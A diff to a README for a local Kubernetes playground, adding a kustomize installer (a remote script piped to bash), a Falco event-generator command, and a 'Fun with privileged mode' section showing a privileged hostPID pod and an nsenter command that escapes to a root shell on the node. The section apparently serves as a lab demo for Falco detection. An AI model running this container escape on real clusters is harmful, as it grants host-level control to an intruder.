@@ -8,6 +8,8 @@
   - [Tear Down](#tear-down)
   - [Add-On: Prometheus & Grafana](#add-on-prometheus--grafana)
   - [Add-On: Falco](#add-on-falco)
+    - [Generate some events](#generate-some-events)
+    - [Fun with privileged mode](#fun-with-privileged-mode)
   - [Play with the Playground](#play-with-the-playground)
     - [Cluster Registry](#cluster-registry)
     - [Create a Deployment on Kubernetes - Echo Server #1](#create-a-deployment-on-kubernetes---echo-server-1)
@@ -51,6 +53,10 @@ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add
 echo "deb https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
 sudo apt-get update
 sudo apt-get install -y kubectl
+
+# kustomize
+curl -s "https://raw.githubusercontent.com/kubernetes-sigs/kustomize/master/hack/install_kustomize.sh"  | bash
+sudo mv ~/kustomize /usr/local/bin
 
 # helm
 curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3
@@ -267,6 +273,62 @@ Relevant kind configuration is already done within the `up.sh` script.
 Falco is integrated with Prometheus and Grafana as well. A Dashboard is available for import with the ID 11914.
 
 ![alt text](images/falco-grafana.png "Grafana Dashboard")
+
+### Generate some events
+
+```sh
+docker run -it --rm falcosecurity/event-generator run syscall --loop
+```
+
+### Fun with privileged mode
+
+```sh
+function shell () {
+  kubectl run shell --restart=Never -it --image krisnova/hack:latest \
+  --rm --attach \
+  --overrides \
+        '{
+          "spec":{
+            "hostPID": true,
+            "containers":[{
+              "name":"scary",
+              "image": "krisnova/hack:latest",
+	      "imagePullPolicy": "Always",
+              "stdin": true,
+              "tty": true,
+              "command":["/bin/bash"],
+	      "nodeSelector":{
+		"dedicated":"master" 
+	      },
+              "securityContext":{
+                "privileged":true
+              }
+            }]
+          }
+        }'
+}
+```
+
+You can paste this into a new file `shell.sh` and source the file.
+
+```sh
+source shell.sh
+```
+
+Then you can type the following to demonstrate a privilege escalation in Kubernetes.
+
+```sh
+shell
+```
+
+If you don't see a command prompt, try pressing enter.
+
+```sh
+root@shell:/# nsenter -t 1 -m -u -i -n bash
+root@playground-control-plane:/# 
+```
+
+Doing this takes advantage of a well known security exploit in Kubernetes.
 
 
 ## Play with the Playground
